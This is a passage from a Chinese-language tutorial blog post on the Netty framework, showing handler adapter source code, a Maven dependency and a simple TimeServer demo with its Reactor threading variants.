&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelReadComplete()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelReadComplete</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelReadComplete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireUserEventTriggered(Object)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">userEventTriggered</span><span class="params">(ChannelHandlerContext ctx, Object evt)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireUserEventTriggered(evt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelWritabilityChanged()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelWritabilityChanged</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelWritabilityChanged();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireExceptionCaught(Throwable)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireExceptionCaught(cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>outbound事件：<code>ChannelOutboundHandlerAdapter</code>，一样的，重写感兴趣的就行了。事件同样和前面列出的相同。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> <span class="keyword">extends</span> <span class="title class_">ChannelHandlerAdapter</span> <span class="keyword">implements</span> <span class="title class_">ChannelOutboundHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#bind(SocketAddress, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(ChannelHandlerContext ctx, SocketAddress localAddress,</span></span><br><span class="line"><span class="params">            ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.bind(localAddress, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#connect(SocketAddress, SocketAddress, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(ChannelHandlerContext ctx, SocketAddress remoteAddress,</span></span><br><span class="line"><span class="params">            SocketAddress localAddress, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.connect(remoteAddress, localAddress, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#disconnect(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">disconnect</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.disconnect(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#close(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.close(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#deregister(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deregister</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.deregister(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#read()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">read</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.read();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#write(Object, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.write(msg, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#flush()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个简单的netty-demo">一个简单的Netty Demo</h2><p>Maven依赖如下，官网上说版本5已经弃用了，我这里用的最新的Netty4.1.28。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.86.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们用Netty框架实现一个服务端的demo。首先我们回想一下，如果你用java的NIO类库，大概流程是啥？</p><ul><li><p>服务端</p><ol type="1"><li>创建<code>ServerSocketChannel</code>，绑定地址</li><li>设置为非阻塞模式，开始监听</li><li>创建监听器<code>Selector</code>，注册<code>ServerSocketChannel</code>到该<code>Selector</code>，并注册感兴趣的<code>SelectionKey</code>为<code>SelectionKey.OP_ACCEPT</code>。</li><li>执行<code>select()</code>，轮询就绪的<code>SocketChannel</code></li></ol><ul><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_ACCEPT</code>），则调用<code>accept()</code>方法接受客户端<ol type="1"><li>设置新接入的客户端的<code>SocketChannel</code>为非阻塞模式</li><li>将其注册到<code>Selector</code>，感兴趣的<code>Selectionkey</code>为<code>SelectionKey.OP_READ</code>。</li></ol></li><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_READ</code>），则构造<code>ByteBuffer</code>读取数据包。</li><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_WRITE</code>），说明数据包没发完，得继续发送。</li></ul></li></ul><p>是不是有点小复杂，在Netty框架下，上面的事情会简单一些：</p><ul><li>服务端<ol type="1"><li>根据Reactor模式（这里是<strong>多actor多线程模型</strong>），创建两个<code>NioEventLoopGroup</code>分别处理监听和业务。</li><li>创建<code>ServerBootstrap</code>以快速配置，包括使用的线程组（监听and 业务）、TCP相关（最大连接数等）、业务Handler。</li><li>绑定端口开始监听。</li><li>若有<code>SocketChannel</code>可用，自动按照我们编写的回调函数处理。此间，读取与写入均使用Netty提供的<code>ByteBuf</code>，相较于<code>ByteBuffer</code>更为方便。</li></ol></li></ul><p>ok结了，是不是相较于原生的用法简单太多了。具体C，S代码如下。</p><h3 id="服务端">服务端</h3><p>根据上面提到的流程，我们首先看一下大致流程：</p><figure><img src="/img/Netty框架学习/image-20230110000156864.png"alt="Netty服务创建流程图" /><figcaption aria-hidden="true">Netty服务创建流程图</figcaption></figure><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.ServerBootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TimeServerHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="comment">// 准备接受数据的ByteBuf，该类是Netty对应ByteBuffer提供的</span></span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            <span class="type">byte</span>[] request = <span class="keyword">new</span> <span class="title class_">byte</span>[buf.readableBytes()];</span><br><span class="line">            buf.readBytes(request);</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(request, StandardCharsets.UTF_8).trim();</span><br><span class="line">            System.out.println(<span class="string">&quot;** 新的请求 ** : &quot;</span> + body);</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;QUERY&quot;</span>.equalsIgnoreCase(body)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()).toString()</span><br><span class="line">                    : <span class="string">&quot;Unknown Command&quot;</span>;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">response</span> <span class="operator">=</span> Unpooled.copiedBuffer(result.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            ctx.write(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ChildChannelHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">TimeServerHandler</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Reactor模式</span></span><br><span class="line">        <span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">upperGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line">            <span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line">            <span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">            bootstrap.group(upperGroup, workerGroup)</span><br><span class="line">                    <span class="comment">// 配置channel类</span></span><br><span class="line">                    .channel(NioServerSocketChannel.class)</span><br><span class="line">                    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">                    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">                    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br><span class="line">            <span class="comment">// 绑定端口，同步等待成功</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">f</span> <span class="operator">=</span> bootstrap.bind(port).sync();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待服务监听端口关闭</span></span><br><span class="line">            f.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 退出，释放线程池资源</span></span><br><span class="line">            <span class="comment">// 区别于shutdownNow()，他还会有个平静期DEFAULT_SHUTDOWN_QUIET_PERIOD，此间若有任务提交他还是会继续工作</span></span><br><span class="line">            <span class="comment">// 可以这很优(nei)雅(juan)</span></span><br><span class="line">            upperGroup.shutdownGracefully();</span><br><span class="line">            workerGroup.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">listenPort</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TimeServer</span>().bind(listenPort);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里着重注意以下片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reactor模式</span></span><br><span class="line"><span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">upperGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(upperGroup, workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>回顾一下前面的Reactor模式，我们首先创建了两个默认的<code>NioEventLoopGroup</code>，并在构造<code>ServerBootstrap</code>时传入，代表我们使用是<strong>多actor多线程的模型</strong>。</p><p>当然如果是单actor多线程的模型，我们构造方式一样，区别代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reactor模式</span></span><br><span class="line"><span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>再退化一下，那单actor单线程呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置服务端的NIO线程组，线程池容量为1</span></span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span 